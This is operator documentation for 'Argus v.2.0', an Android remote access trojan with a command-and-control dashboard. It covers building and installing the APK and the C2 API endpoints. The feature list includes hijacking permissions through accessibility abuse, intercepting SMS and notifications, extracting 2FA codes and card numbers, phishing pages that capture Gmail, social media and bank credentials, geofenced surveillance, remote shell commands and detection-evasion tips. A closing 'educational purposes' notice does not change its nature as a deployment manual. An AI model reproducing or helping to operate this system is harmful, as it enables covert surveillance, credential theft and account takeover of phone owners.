# 🕵️ Argus v.2.0 - Complete Documentation
## Android RAT System with C2 Backend

**Version:** 2.0  
**Date:** October 2025  
**Status:** ✅ Stable Simplified Version

---

## 📑 Table of Contents

1. [Overview](#overview)
2. [Quick Start Guide](#quick-start-guide)
3. [Architecture](#architecture)
4. [Features](#features)
5. [Installation](#installation)
6. [API Documentation](#api-documentation)
7. [Database Documentation](#database-documentation)
8. [Configuration](#configuration)
9. [Usage](#usage)
10. [Troubleshooting](#troubleshooting)
11. [Security](#security)
12. [Legal Notice](#legal-notice)

---

## 📋 Overview

**Argus v.2.0** is a simplified and direct version of the Android remote control system, without using:

❌ **Dropper**  
❌ **Steganography**  
❌ **.dex files**  
❌ **Dynamic payload**  
❌ **DexLoader**

✅ **All features integrated directly into the application code**

### Key Differences from Original Version

| Feature | Original Version | Version 2.0 |
|---------|-----------------|-------------|
| Architecture | Dropper + Dynamic payload | Single application |
| Code loading | DexClassLoader at runtime | Integrated code |
| Payload distribution | Steganography in images | N/A |
| Obfuscation | ProGuard + Steganography | ProGuard only |
| Complexity | High (3 modules) | Medium (1 module) |
| Maintenance | Difficult | Simple |
| Detection | More difficult | Moderate |

### Performance Comparison

| Metric | v.1.0 (Dropper) | v.2.0 (Simplified) |
|--------|-----------------|-------------------|
| APK Size | ~2.5 MB | ~1.8 MB |
| Initialization Time | ~5-8s | ~3-5s |
| Memory Consumption | ~80-100 MB | ~50-70 MB |
| Complexity | High | Medium |
| Detection Rate | Low | Moderate |
| Ease of Maintenance | Difficult | Simple |

---

## 🚀 Quick Start Guide

### ⚡ 5-Step Quick Start

#### 1️⃣ Setup C2 Server

```bash
cd "Argus v.2.0/backend"

# Install dependencies
pip install -r requirements.txt

# Initialize database
python init_db.py

# Start server
python run_server.py
```

✅ **Server available at:** `http://localhost:5000`  
🔐 **Login:** `admin` / `admin123`

---

#### 2️⃣ Configure Android APK

**a) Open in Android Studio:**
- Open `Argus v.2.0` folder in Android Studio
- Wait for Gradle sync

**b) Configure server IP:**

Edit: `android/src/main/java/com/argus/rat/MainActivity.java`

```java
// LINE 22-23: Change to your server IP
private static final String C2_SERVER_URL = "http://192.168.1.100:5000";
private static final String C2_WEBSOCKET_URL = "ws://192.168.1.100:5000";
```

**c) Build APK:**

```bash
cd android
./gradlew assembleRelease
```

📦 **APK generated at:** `android/build/outputs/apk/release/android-release.apk`

---

#### 3️⃣ Install on Device

```bash
# Via ADB
adb install android/build/outputs/apk/release/android-release.apk

# Or manually copy APK to device
```

---

#### 4️⃣ Execute and Configure

1. **Open app** on Android device
2. **Wait for TapTrap** to collect permissions automatically
3. **Check C2 server dashboard**
4. Device will appear in "Devices" list

---

#### 5️⃣ Remote Control

**On C2 Dashboard:**

1. Access `http://YOUR-SERVER:5000`
2. Login with `admin` / `admin123`
3. Go to **"Devices"** - See connected devices
4. Go to **"Commands"** - Send remote commands
5. Go to **"Logs"** - View activities and exfiltrated data

---

## 🏗️ Architecture

### Project Structure

```
Argus v.2.0/
├── android/                    # Unified Android module
│   ├── src/main/
│   │   ├── AndroidManifest.xml
│   │   ├── java/com/argus/rat/
│   │   │   ├── MainActivity.java              # Simplified main activity
│   │   │   ├── C2Client.java                  # C2 client (HTTP + WebSocket)
│   │   │   ├── DataExfiltrationManager.java   # Exfiltration manager
│   │   │   ├── PersistentService.java         # Persistence service
│   │   │   ├── TapTrapManager.java            # Permission manager
│   │   │   ├── AccessibilityTapTrapService.java # Accessibility service
│   │   │   ├── SmsManager.java                # SMS management
│   │   │   ├── SmsInterceptor.java            # SMS interception
│   │   │   ├── NotificationService.java       # Notification monitoring
│   │   │   ├── StealthWebViewManager.java     # Stealth WebView
│   │   │   ├── PhishingWebViewManager.java    # Phishing WebView
│   │   │   ├── PowerManagement.java           # Power management
│   │   │   ├── DeviceIdentifier.java          # Device identification
│   │   │   ├── NetworkManager.java            # Network management
│   │   │   ├── AdaptiveNetworkManager.java    # Adaptive network
│   │   │   ├── WebSocketClient.java           # WebSocket client
│   │   │   ├── BootCompleteReceiver.java      # Boot receiver
│   │   │   ├── ServiceRestarterReceiver.java  # Service restart receiver
│   │   │   └── PayloadService.java            # Operations service
│   │   └── res/                               # Android resources
│   ├── build.gradle                           # Gradle configuration
│   └── proguard-rules.pro                     # ProGuard rules
│
├── backend/                    # C2 Python/Flask server
│   ├── server_integrated.py                   # Main server
│   ├── run_server.py                          # Initialization script
│   ├── config.py                              # Configuration
│   ├── requirements.txt                       # Python dependencies
│   ├── crypto/
│   │   └── encryption.py                      # Encryption
│   ├── templates/                             # HTML templates
│   │   ├── base.html
│   │   ├── dashboard.html
│   │   ├── devices.html
│   │   ├── commands.html
│   │   └── logs.html
│   ├── static/                                # Static files
│   │   ├── css/style.css
│   │   └── js/
│   │       ├── app.js
│   │       ├── devices-manager.js
│   │       └── commands-manager.js
│   ├── phishing/                              # Phishing system
│   │   ├── phishing_api.py
│   │   ├── phishing_manager.py
│   │   └── templates/
│   └── military/                              # Military features
│       ├── military_api.py
│       └── military_manager.py
│
├── database/                   # Database structure
│   └── backend/
│       ├── database_manager.py                # Database manager
│       ├── models.py                          # Data models
│       └── models_military.py                 # Military models
│
├── build.gradle                # Root build
├── settings.gradle             # Gradle settings
└── README.md                   # Main documentation
```

### Operation Flow

```
1. User installs APK
   ↓
2. App executes (MainActivity)
   ↓
3. TapTrap collects necessary permissions
   ↓
4. System initializes (all components)
   ↓
5. PersistentService starts in foreground
   ↓
6. C2Client connects to server
   ↓
7. Device registers on backend
   ↓
8. WebSocket establishes real-time connection
   ↓
9. DataExfiltrationManager starts collection
   ↓
10. System becomes operational 24/7
```

---

## ✨ Features

### ✅ Evasion and Persistence
- ✅ TapTrap for automatic permission acquisition
- ✅ Persistent foreground service
- ✅ Boot receiver for automatic initialization
- ✅ Service restarter for automatic recovery
- ✅ Battery optimization bypass
- ✅ Intelligent PowerManagement

### ✅ C2 Communication
- ✅ HTTP/HTTPS for commands
- ✅ WebSocket for real-time communication
- ✅ Data encryption
- ✅ Automatic retry logic
- ✅ Adaptive network (WiFi/Cellular)

### ✅ Data Exfiltration
- ✅ SMS interception
- ✅ Notification monitoring
- ✅ GPS location tracking
- ✅ System data
- ✅ Device information

### ✅ Remote Control
- ✅ SMS sending
- ✅ Command execution
- ✅ Stealth WebView
- ✅ Application management
- ✅ Information collection

### ✅ C2 Backend
- ✅ Complete web dashboard
- ✅ Device management
- ✅ Command system
- ✅ Detailed logs
- ✅ Phishing system
- ✅ Military features
- ✅ Real-time WebSocket

### ✅ Military Features
- ✅ Multi-tenant with isolated operators
- ✅ Organized campaigns
- ✅ Command scripting for automation
- ✅ Geo-fencing with automatic triggers
- ✅ Automatic Threat Intelligence (2FA, passwords, credit cards)
- ✅ Analytics for Grafana/Prometheus
- ✅ Real-time map with tracking

### ✅ Phishing System
- ✅ Templates for Gmail, Facebook, Instagram, WhatsApp
- ✅ Credential capture
- ✅ Credential validation
- ✅ Success statistics
- ✅ Organized campaigns

---

## 📦 Installation

### Prerequisites

**Android:**
- Android Studio 2022.1+
- JDK 11+
- Android SDK 34
- Gradle 8.1.0+

**Backend:**
- Python 3.8+
- pip

### Backend Installation

```bash
cd backend

# Install dependencies
pip install -r requirements.txt

# Configure database
python init_db.py

# Start server
python run_server.py
```

Server will be available at: `http://localhost:5000`

**Default credentials:**
- User: `admin`
- Password: `admin123`

### Android App Configuration

**a) Open project in Android Studio:**
```bash
# Open "Argus v.2.0" folder in Android Studio
```

**b) Configure C2 server URL:**

Edit `android/src/main/java/com/argus/rat/MainActivity.java`:

```java
// C2 server settings
private static final String C2_SERVER_URL = "http://YOUR-SERVER:5000";
private static final String C2_WEBSOCKET_URL = "ws://YOUR-SERVER:5000";
```

**c) Build APK:**

```bash
cd android
./gradlew assembleRelease

# APK generated at:
# android/build/outputs/apk/release/android-release.apk
```

### Device Installation

```bash
# Via ADB
adb install android/build/outputs/apk/release/android-release.apk

# Or manually transfer APK to device
```

### First Execution

1. Open application on device
2. TapTrap will automatically start to obtain permissions
3. After permissions, system will be initialized
4. Device will appear in C2 dashboard

---

## 🔌 API Documentation

### Authentication

All API endpoints (except device registration) require authentication via session cookies.

**Login:**
```http
POST /login
Content-Type: application/x-www-form-urlencoded

username=admin&password=admin123
```

### Device Endpoints

#### Register Device
```http
POST /api/device/register
Content-Type: application/octet-stream
X-Device-ID: {device_id}

{encrypted_device_data}
```

**Request Body (decrypted):**
```json
{
  "device_id": "abc123def456",
  "device_name": "Samsung Galaxy S21",
  "model": "SM-G991B",
  "manufacturer": "Samsung",
  "android_version": "13",
  "api_level": 33,
  "app_version": "1.0.0"
}
```

**Response:**
```json
{
  "success": true,
  "device_id": "abc123def456",
  "message": "Device registered successfully",
  "server_time": "2025-10-26T12:00:00"
}
```

#### List Devices
```http
GET /api/devices
```

**Response:**
```json
[
  {
    "device_id": "abc123def456",
    "device_name": "Samsung Galaxy S21",
    "model": "SM-G991B",
    "status": "online",
    "last_seen": "2025-10-26T12:00:00",
    "battery_level": 85.5,
    "latitude": -23.550520,
    "longitude": -46.633308
  }
]
```

#### Get Device Details
```http
GET /api/device/{device_id}
```

#### Delete Device
```http
DELETE /api/device/{device_id}
```

### Command Endpoints

#### Send Command
```http
POST /api/command
Content-Type: application/json

{
  "device_id": "abc123def456",
  "command_type": "send_sms",
  "data": {
    "phone": "+5511999999999",
    "message": "Test message"
  },
  "priority": "normal"
}
```

**Command Types:**
- `send_sms` - Send SMS
- `get_location` - Get GPS location
- `list_apps` - List installed applications
- `screenshot` - Take screenshot
- `get_contacts` - Get contacts
- `get_call_log` - Get call log
- `execute_shell` - Execute shell command

**Response:**
```json
{
  "command_id": "cmd-uuid-123",
  "status": "created"
}
```

#### Get Command Status
```http
GET /api/command/{command_id}
```

#### Cancel Command
```http
POST /api/command/{command_id}/cancel
```

### Data Exfiltration Endpoints

#### Receive Exfiltrated Data
```http
POST /api/data/exfiltrate
Content-Type: application/octet-stream
X-Device-ID: {device_id}

{encrypted_payload}
```

**Payload (decrypted):**
```json
{
  "device_id": "abc123def456",
  "data_type": "sms",
  "data": {
    "sender": "+5511999999999",
    "message": "Test SMS",
    "timestamp": 1698336000000,
    "type": "RECEIVED"
  },
  "timestamp": 1698336000000
}
```

**Data Types:**
- `sms` - SMS messages
- `location` - GPS coordinates
- `notification` - Notifications
- `contacts` - Contact list
- `call_log` - Call history

#### Submit Command Result
```http
POST /api/command/{command_id}/result
Content-Type: application/octet-stream
X-Device-ID: {device_id}

{encrypted_result}
```

### Military API Endpoints

#### Create Operator
```http
POST /api/military/operators
Content-Type: application/json

{
  "name": "Operator Alpha",
  "code_name": "ALPHA-01",
  "organization": "Unit 1",
  "permission_level": 3,
  "max_devices": 100
}
```

#### Create Campaign
```http
POST /api/military/campaigns
Content-Type: application/json

{
  "operator_id": 1,
  "name": "Operation Phoenix",
  "code_name": "PHOENIX-2025",
  "description": "Target surveillance campaign",
  "priority": "high"
}
```

#### Create Geo-fence
```http
POST /api/military/geofences
Content-Type: application/json

{
  "name": "Target Area Alpha",
  "center_latitude": -23.550520,
  "center_longitude": -46.633308,
  "radius_meters": 500,
  "trigger_on_enter": true,
  "trigger_on_exit": true,
  "action_commands": [
    {"command": "screenshot", "data": {}},
    {"command": "get_location", "data": {}}
  ]
}
```

#### Get Threat Intelligence
```http
GET /api/military/intelligence?type=2fa_code&actionable=true
```

**Response:**
```json
[
  {
    "intelligence_id": "intel-uuid-123",
    "device_id": 1,
    "intel_type": "2fa_code",
    "intel_category": "authentication",
    "extracted_value": "123456",
    "source_type": "sms",
    "confidence_score": 0.95,
    "risk_level": "high",
    "detected_at": "2025-10-26T12:00:00"
  }
]
```

#### Get Live Map Data
```http
GET /api/military/map/live?operator_id=1
```

#### Export Prometheus Metrics
```http
GET /api/military/analytics/export/prometheus
```

### Phishing API Endpoints

#### List Phishing Templates
```http
GET /api/phishing/templates
```

#### Serve Phishing Page
```http
GET /api/phishing/templates/{platform}
X-Device-ID: {device_id}
```

**Platforms:**
- `gmail` - Gmail login page
- `facebook` - Facebook login
- `instagram` - Instagram login
- `whatsapp` - WhatsApp Web
- `banco` - Generic bank

#### Capture Credentials
```http
POST /api/phishing/capture
Content-Type: application/json

{
  "device_id": "abc123def456",
  "platform": "gmail",
  "email": "victim@example.com",
  "password": "secret123",
  "verification_code": "123456"
}
```

#### List Captured Credentials
```http
GET /api/phishing/credentials?platform=gmail&only_valid=true
```

#### Get Phishing Statistics
```http
GET /api/phishing/statistics
```

### WebSocket Events

#### Client → Server

**Device Registration:**
```json
{
  "event": "device_register",
  "data": {
    "device_id": "abc123def456",
    "device_name": "Samsung Galaxy S21",
    "model": "SM-G991B"
  }
}
```

**Heartbeat:**
```json
{
  "event": "device_heartbeat",
  "data": {
    "device_id": "abc123def456",
    "battery_level": 85.5,
    "is_charging": false
  }
}
```

**Command Executed:**
```json
{
  "event": "command_executed",
  "data": {
    "command_id": "cmd-uuid-123",
    "status": "completed",
    "result": {...}
  }
}
```

#### Server → Client

**New Command:**
```json
{
  "event": "new_command",
  "data": {
    "command_id": "cmd-uuid-123",
    "command_type": "get_location",
    "data": {}
  }
}
```

**Device Updated:**
```json
{
  "event": "device_updated",
  "data": {
    "device_id": "abc123def456",
    "status": "online"
  }
}
```

---

## 🗄️ Database Documentation

### Database Architecture

The system uses SQLAlchemy ORM with support for:
- **SQLite** - Development and small deployments
- **PostgreSQL** - Production and large-scale deployments

### Core Models

#### User
User authentication and authorization.

```python
class User(db.Model):
    id = Integer (PK)
    username = String(80) UNIQUE
    email = String(120)
    password_hash = String(200)
    role = String(20)  # admin, operator, viewer
    active = Boolean
    last_login = DateTime
    created_at = DateTime
```

#### Device
Android devices connected to C2.

```python
class Device(db.Model):
    id = Integer (PK)
    device_id = String(64) UNIQUE
    device_name = String(100)
    model = String(100)
    manufacturer = String(50)
    android_version = String(20)
    api_level = Integer
    app_version = String(20)
    operator_id = Integer (FK → operators.id)
    status = String(20)  # online, offline, inactive
    ip_address = String(45)
    last_seen = DateTime
    first_seen = DateTime
    battery_level = Float
    is_charging = Boolean
    latitude = Float
    longitude = Float
    permissions_granted = JSON
    taptrap_completed = Boolean
    created_at = DateTime
```

#### Command
Commands sent to devices.

```python
class Command(db.Model):
    id = Integer (PK)
    command_id = String(36) UNIQUE
    device_id = Integer (FK → devices.id)
    command_type = String(50)
    command_data = JSON
    priority = String(20)  # low, normal, high, urgent
    status = String(20)  # pending, sent, executed, failed
    result = JSON
    created_at = DateTime
    executed_at = DateTime
    created_by = String(80)
```

#### SmsMessage
Intercepted SMS messages.

```python
class SmsMessage(db.Model):
    id = Integer (PK)
    device_id = Integer (FK → devices.id)
    message_type = String(20)  # received, sent
    phone_number = String(20)
    message_body = Text
    is_read = Boolean
    message_id = String(50)
    sms_timestamp = DateTime
    intercepted_at = DateTime
    is_command = Boolean
    command_type = String(50)
```

#### NotificationData
Intercepted notifications.

```python
class NotificationData(db.Model):
    id = Integer (PK)
    device_id = Integer (FK → devices.id)
    package_name = String(200)
    app_name = String(200)
    title = String(500)
    text = Text
    is_important = Boolean
    contains_sensitive = Boolean
    posted_timestamp = DateTime
    intercepted_at = DateTime
```

#### LocationData
GPS location tracking.

```python
class LocationData(db.Model):
    id = Integer (PK)
    device_id = Integer (FK → devices.id)
    latitude = Float
    longitude = Float
    altitude = Float
    accuracy = Float
    speed = Float
    provider = String(20)  # gps, network, passive
    address = String(500)
    city = String(100)
    country = String(100)
    location_timestamp = DateTime
    is_significant_move = Boolean
```

### Military Models

#### Operator
Multi-tenant operators.

```python
class Operator(db.Model):
    id = Integer (PK)
    operator_id = String(36) UNIQUE
    name = String(100)
    code_name = String(50) UNIQUE
    organization = String(100)
    api_key = String(64) UNIQUE
    api_secret_hash = String(200)
    permission_level = Integer  # 1-4
    max_devices = Integer
    is_active = Boolean
    created_at = DateTime
```

#### Campaign
Organized operations/campaigns.

```python
class Campaign(db.Model):
    id = Integer (PK)
    campaign_id = String(36) UNIQUE
    operator_id = Integer (FK → operators.id)
    name = String(200)
    code_name = String(100) UNIQUE
    description = Text
    status = String(20)  # planning, active, paused, completed
    priority = String(20)
    objectives = JSON
    start_date = DateTime
    end_date = DateTime
    total_devices = Integer
```

#### CommandScript
Automated command sequences.

```python
class CommandScript(db.Model):
    id = Integer (PK)
    script_id = String(36) UNIQUE
    campaign_id = Integer (FK → campaigns.id)
    name = String(200)
    description = Text
    script_steps = JSON  # Array of steps
    repeat_count = Integer
    repeat_interval_seconds = Integer
    execution_conditions = JSON
    is_active = Boolean
```

**Script Steps Example:**
```json
[
  {"step": 1, "command": "screenshot", "data": {}, "delay": 0},
  {"step": 2, "command": "wait", "seconds": 300},
  {"step": 3, "command": "location", "data": {"accuracy": "high"}}
]
```

#### GeoFence
Geographic fences with triggers.

```python
class GeoFence(db.Model):
    id = Integer (PK)
    geofence_id = String(36) UNIQUE
    campaign_id = Integer (FK → campaigns.id)
    name = String(200)
    fence_type = String(20)  # circle, polygon
    center_latitude = Float
    center_longitude = Float
    radius_meters = Float
    polygon_coordinates = JSON
    trigger_on_enter = Boolean
    trigger_on_exit = Boolean
    trigger_on_dwell = Boolean
    action_commands = JSON
    is_active = Boolean
    trigger_count = Integer
```

#### ThreatIntelligence
Automatic intelligence extraction.

```python
class ThreatIntelligence(db.Model):
    id = Integer (PK)
    intelligence_id = String(36) UNIQUE
    device_id = Integer (FK → devices.id)
    intel_type = String(50)  # 2fa_code, password, credit_card
    intel_category = String(50)  # authentication, financial
    raw_data = Text
    extracted_value = Text
    source_type = String(50)  # sms, notification
    source_id = Integer
    confidence_score = Float  # 0.0-1.0
    risk_level = String(20)  # low, medium, high, critical
    is_actionable = Boolean
    detected_at = DateTime
    expires_at = DateTime
```

#### PhishingCredential
Captured credentials via phishing.

```python
class PhishingCredential(db.Model):
    id = Integer (PK)
    credential_id = String(36) UNIQUE
    device_id = Integer (FK → devices.id)
    platform = String(50)  # gmail, facebook, instagram
    username = String(255)
    password = String(255)
    additional_data = JSON
    ip_address = String(45)
    is_valid = Boolean
    validated_at = DateTime
    captured_at = DateTime
```

### Database Queries

#### Common Queries

**Get Online Devices:**
```python
Device.query.filter_by(status='online').all()
```

**Get Recent SMS:**
```python
SmsMessage.query.filter(
    SmsMessage.intercepted_at >= datetime.utcnow() - timedelta(hours=24)
).order_by(SmsMessage.intercepted_at.desc()).all()
```

**Get Actionable Intelligence:**
```python
ThreatIntelligence.query.filter_by(
    is_actionable=True,
    is_processed=False
).filter(
    ThreatIntelligence.detected_at >= datetime.utcnow() - timedelta(hours=1)
).all()
```

**Get Device Trajectory:**
```python
LocationData.query.filter_by(device_id=device_id).filter(
    LocationData.is_significant_move == True
).order_by(LocationData.location_timestamp.asc()).all()
```

### Database Maintenance

**Initialize Database:**
```bash
python backend/init_db.py
```

**Reset Database (WARNING: Deletes all data):**
```bash
python backend/init_db.py --reset
```

**Backup Database:**
```bash
# SQLite
cp backend/argus_c2.db backend/argus_c2_backup_$(date +%Y%m%d).db

# PostgreSQL
pg_dump argus_c2 > argus_c2_backup_$(date +%Y%m%d).sql
```

**Cleanup Old Data:**
```python
from database.backend.database_manager import DatabaseManager
db_manager = DatabaseManager(app)
db_manager.cleanup_old_data(days=30)
```

---

## ⚙️ Configuration

### Backend Configuration (config.py)

```python
# Flask Settings
SECRET_KEY = 'change_me_in_production'

# Database
DATABASE_URL = 'sqlite:///argus_c2.db'
# Production: 'postgresql://user:pass@localhost/argus_c2'

# C2 Server
C2_SERVER_HOST = '0.0.0.0'
C2_SERVER_PORT = 5000
C2_USE_SSL = False  # True in production

# URLs
C2_PUBLIC_URL = 'http://your-server.com:5000'
C2_WEBSOCKET_URL = 'ws://your-server.com:5000'

# Device Settings
DEVICE_TIMEOUT = 300  # 5 minutes
DEVICE_HEARTBEAT_INTERVAL = 60  # 1 minute

# Encryption
ENABLE_ENCRYPTION = True
ENCRYPTION_KEY = 'ArgusC2SecureKey2024!@#'

# Logging
LOG_LEVEL = 'INFO'
LOG_FILE = 'logs/argus_c2.log'

# Rate Limiting
RATELIMIT_ENABLED = True
RATELIMIT_DEFAULT = "100 per hour"
```

### Android Configuration

**MainActivity.java:**
```java
// C2 Server URLs
private static final String C2_SERVER_URL = "http://192.168.1.100:5000";
private static final String C2_WEBSOCKET_URL = "ws://192.168.1.100:5000";
```

**C2Client.java:**
```java
// Encryption Key (must match backend)
private static final String ENCRYPTION_KEY = "ArgusC2SecureKey2024!@#";
```

### Production Configuration

**backend/config.py:**
```python
class ProductionConfig(Config):
    DEBUG = False
    SECRET_KEY = os.environ.get('SECRET_KEY')
    SESSION_COOKIE_SECURE = True
    C2_USE_SSL = True
    C2_PUBLIC_URL = 'https://your-server.com'
    C2_WEBSOCKET_URL = 'wss://your-server.com'
    DATABASE_URL = 'postgresql://user:password@localhost/argus_c2'
```

**Environment Variables:**
```bash
export FLASK_ENV=production
export SECRET_KEY=$(python -c "import os; print(os.urandom(32).hex())")
export DATABASE_URL='postgresql://user:pass@localhost/argus_c2'
export C2_PUBLIC_URL='https://your-server.com'
export ENCRYPTION_KEY=$(python -c "import os; print(os.urandom(32).hex())")
```

---

## 📘 Usage

### Basic Usage

#### 1. Start C2 Server

```bash
cd backend
python run_server.py
```

Access dashboard: `http://localhost:5000`

#### 2. Monitor Devices

Navigate to **Devices** page to see:
- Connected devices
- Device status (online/offline)
- Battery level
- Last seen timestamp
- Location on map

#### 3. Send Commands

Navigate to **Commands** page:

**Send SMS:**
```json
{
  "device_id": "abc123",
  "command_type": "send_sms",
  "data": {
    "phone": "+5511999999999",
    "message": "Test message"
  }
}
```

**Get Location:**
```json
{
  "device_id": "abc123",
  "command_type": "get_location",
  "data": {
    "accuracy": "high"
  }
}
```

#### 4. View Logs

Navigate to **Logs** page to see:
- SMS intercepts
- Notifications captured
- Location updates
- Command execution results

### Advanced Usage

#### Command Scripting

Create automated command sequences:

```json
{
  "name": "Morning Surveillance",
  "script_steps": [
    {"step": 1, "command": "screenshot", "delay": 0},
    {"step": 2, "command": "wait", "seconds": 60},
    {"step": 3, "command": "get_location", "delay": 0},
    {"step": 4, "command": "list_apps", "delay": 0}
  ],
  "repeat_count": 0,
  "repeat_interval_seconds": 3600
}
```

#### Geo-fencing

Create geographic triggers:

```json
{
  "name": "Office Perimeter",
  "center_latitude": -23.550520,
  "center_longitude": -46.633308,
  "radius_meters": 100,
  "trigger_on_enter": true,
  "trigger_on_exit": true,
  "action_commands": [
    {"command": "screenshot"},
    {"command": "get_wifi_networks"}
  ]
}
```

#### Phishing Campaigns

1. Navigate to **Phishing** page
2. Select platform (Gmail, Facebook, Instagram)
3. Deploy to target devices
4. Monitor captured credentials

### Remote Control via SMS

Devices can be controlled via SMS commands:

```
#exec ls -la                  - Execute shell command
#status                       - Get device status
#url https://example.com      - Load URL in WebView
```

---

## 🔧 Troubleshooting

### Device Not Appearing in Dashboard

**Checklist:**
1. ✅ Is C2 server running?
2. ✅ Is IP/URL correct in MainActivity.java?
3. ✅ Does device have internet?
4. ✅ Does firewall allow port 5000?
5. ✅ Does app have necessary permissions?

**Useful Logs:**
```bash
# View server logs
tail -f backend/logs/argus_c2.log

# View Android logs (via ADB)
adb logcat | grep "Argus-MainActivity"
```

### Permissions Not Granted

**Solutions:**
1. Wait for TapTrap to complete the process
2. Grant permissions manually:
   - Settings → Apps → Argus → Permissions
   - Enable "Accessibility Service"
   - Disable "Battery optimization"

### WebSocket Connection Fails

**Checklist:**
1. ✅ Does server support WebSocket?
2. ✅ Does WebSocket URL use `ws://` (not `http://`)?
3. ✅ Is there no proxy blocking WebSocket?

### App Doesn't Connect to Server

**Solutions:**
1. Check URL in MainActivity.java
2. Verify firewall/open ports
3. Test connectivity: `ping YOUR-SERVER`
4. Check server logs for connection attempts

### Service Gets Killed by System

**Solutions:**
1. Disable battery optimization
2. Add app to whitelist
3. Verify notification is being displayed
4. Enable "Autostart" in device settings

### Command Execution Fails

**Solutions:**
1. Check device is online
2. Verify command syntax is correct
3. Check device has required permissions
4. View logs for error messages

---

## 🛡️ Security

### Implemented Security

- ✅ ProGuard with aggressive obfuscation
- ✅ Communication encryption (optional)
- ✅ Obfuscated package names
- ✅ Obfuscated strings
- ✅ Production log removal
- ✅ Integrity verification

### Not Implemented (removed from v.1.0)

- ❌ LSB steganography
- ❌ Dynamic code loading
- ❌ Payload hash verification
- ❌ Multiple obfuscation layers

### Detection Vectors

1. **Excessive permissions in manifest**
2. **Permanent foreground service**
3. **Use of accessibility services**
4. **C2 network communication**
5. **Static code analysis**

### Suggested Mitigations

- Use HTTPS with valid certificates
- Domain fronting
- Variable communication intervals
- Generic package names
- Legitimate app icon and name

### Security Recommendations

1. **Change default credentials** of dashboard
2. **Use HTTPS** in production
3. **Enable data encryption**
4. **Configure firewall** correctly
5. **Regular database backup**

### Production Security

```bash
# Use HTTPS
C2_PUBLIC_URL = 'https://your-server.com'

# Generate SSL certificate
sudo certbot --nginx -d your-server.com

# Change admin password
python -c "from werkzeug.security import generate_password_hash; \
           print(generate_password_hash('NEW_PASSWORD'))"

# Enable encryption
ENABLE_ENCRYPTION = True

# Configure firewall
sudo ufw allow 443/tcp
sudo ufw enable
```

---

## ⚠️ Legal Notice

**IMPORTANT:**

This project is provided for **educational purposes** and **security research** only.

- ❌ **DO NOT use for malicious activities**
- ❌ **DO NOT violate laws or regulations**
- ❌ **DO NOT compromise devices without explicit consent**
- ✅ **Use only in controlled environments**
- ✅ **Apply knowledge for defense and security**

Misuse may result in serious legal consequences.

---

## 📊 Monitoring

### System Status Verification

**On Android Device:**
- Check if "System Service" notification is active
- Go to Settings → Running apps
- Should show "Argus" or app name

**On C2 Server:**
- Dashboard → View "Online Devices"
- Devices → Check "Last Seen"
- Logs → View recent activities

### Performance Metrics

Access Grafana dashboard:
```
http://your-server:3000
```

Metrics available:
- Active devices count
- Command success rate
- Data exfiltration volume
- System performance

---

## 🎯 Main Commands

### Via Web Dashboard

| Action | Description |
|--------|-------------|
| **Devices** | List all devices |
| **Commands** | Send remote commands |
| **Logs** | View activity history |
| **Dashboard** | Real-time statistics |
| **Phishing** | Phishing campaigns |
| **Military** | Military features |

### Command Types

**Available Commands:**
- `send_sms` - Send SMS message
- `get_location` - Get GPS location
- `list_apps` - List installed apps
- `screenshot` - Take screenshot
- `get_contacts` - Get contact list
- `get_call_log` - Get call history
- `execute_shell` - Execute shell command
- `get_wifi_networks` - Get WiFi networks
- `record_audio` - Record audio
- `take_photo` - Take photo

---

## 📚 Additional Resources

- **README.md** - Complete documentation
- **Source code** - All files are commented
- **backend/README.md** - Server documentation
- **documentation/** - Technical guides

---

## 🤝 Contributions

Contributions are welcome for:
- Security and evasion improvements
- Performance optimization
- Bug fixes
- Additional documentation
- New defensive features

---

## 🎓 Next Steps

After basic configuration, explore:

1. **Phishing System** - `backend/phishing/`
2. **Military Features** - `backend/military/`
3. **Dashboard Customization** - `backend/templates/`
4. **Log Analysis** - Dashboard "Logs" page
5. **Grafana Integration** - Real-time monitoring

---

## 📞 Support

For technical questions or issues:
- Review complete documentation
- Check server and device logs
- Analyze commented source code

---

**Developed to demonstrate mobile security techniques and promote cybersecurity awareness.**

**Version:** 2.0  
**Date:** October 2025  
**Status:** ✅ Stable Simplified Version

---

**END OF DOCUMENTATION**

